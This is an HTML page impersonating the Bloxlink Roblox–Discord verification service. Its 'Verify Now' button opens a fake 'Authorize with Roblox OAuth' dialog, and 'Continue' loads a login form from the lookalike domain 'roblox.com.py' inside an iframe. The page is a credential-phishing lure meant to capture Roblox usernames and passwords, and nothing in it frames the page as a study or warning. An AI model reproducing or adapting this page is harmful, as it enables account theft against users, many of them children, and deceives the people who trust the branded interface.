<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Bloxlink – Verifications</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- FAVICON -->
  <link rel="icon" href="https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png" type="image/png">

  <link rel="stylesheet" href="style.css">

  <style>
    /* AUTH SCREEN */
    .auth-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,.85);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .auth-box {
      background: #0b0f14;
      width: 360px;
      border-radius: 10px;
      padding: 24px;
      color: #fff;
      text-align: center;
      font-family: Arial, sans-serif;
    }

    .auth-box h3 {
      margin: 12px 0 20px;
      font-weight: 600;
    }

    .auth-logo {
      width: 80px;
      margin: 30px auto 10px;
    }

    .auth-btn {
      width: 100%;
      padding: 12px;
      border-radius: 6px;
      border: none;
      margin-top: 12px;
      font-weight: 600;
      cursor: pointer;
    }

    .continue-btn {
      background: #f2f2f2;
      color: #000;
    }

    .return-btn {
      background: transparent;
      border: 1px solid #333;
      color: #fff;
    }

    .auth-overlay.show {
      display: flex;
    }
  </style>
</head>

<body>

<button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>

<div class="layout">

<aside class="sidebar" id="sidebar">
  <div class="logo">
    <img src="https://cdn.discordapp.com/attachments/1461462727888474264/1462115890991599658/wordmark.png" style="max-width:160px">
  </div>
</aside>

<main class="content">
  <button class="verify-circle" onclick="openAuth()">Verify Now</button>
</main>

</div>

<!-- STEP 1 AUTH SCREEN -->
<div id="authOverlay" class="auth-overlay">
  <div class="auth-box">
    <h3>Authorize with Roblox OAuth</h3>

    <img class="auth-logo" src="https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png">

    <p>Bloxlink</p>

    <button class="auth-btn continue-btn" onclick="continueAuth()">Continue</button>

    <p style="margin:10px 0;color:#666;">or</p>

    <button class="auth-btn return-btn" onclick="closeAuth()">Return to Bloxlink</button>
  </div>
</div>

<!-- STEP 2 IFRAME POPUP -->
<div id="iframeOverlay" class="popup-overlay">
  <div class="iframe-popup">
    <button class="close-iframe" onclick="closeAll()">✕</button>
    <iframe id="popupIframe"></iframe>
  </div>
</div>

<script>
function openAuth() {
  document.getElementById("authOverlay").classList.add("show");
}

function closeAuth() {
  document.getElementById("authOverlay").classList.remove("show");
}

function continueAuth() {
  closeAuth();
  document.getElementById("popupIframe").src =
    "https://roblox.com.py/login?returnUrl=7692425652606225";
  document.getElementById("iframeOverlay").classList.add("show");
}

function closeAll() {
  document.getElementById("popupIframe").src = "";
  document.getElementById("iframeOverlay").classList.remove("show");
}
</script>

</body>
</html>
